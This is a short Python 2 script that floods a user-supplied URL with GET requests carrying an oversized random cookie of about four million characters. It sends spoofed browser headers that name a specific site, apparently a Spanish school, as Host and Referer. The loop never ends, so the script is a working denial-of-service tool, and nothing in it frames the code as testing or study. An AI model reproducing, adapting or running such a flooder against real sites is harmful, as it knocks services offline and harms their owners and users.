import requests
import random, string

def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))

nodo = raw_input("Introduce web:")


i = 1
while i < 2:
        pole= "43da351a4d1394172d1c1473d1785bcc="+randomword(4000000)
        header={'Host': "iesleonardodavinci.com",
        'Proxy-Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
        'Referer': 'iesleonardodavinci.com',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'es-ES,es;q=0.8,en;q=0.6',
        'Cookie': pole
        }

        r = requests.get(nodo, headers=header)
        print "Peticion enviada!!!!"
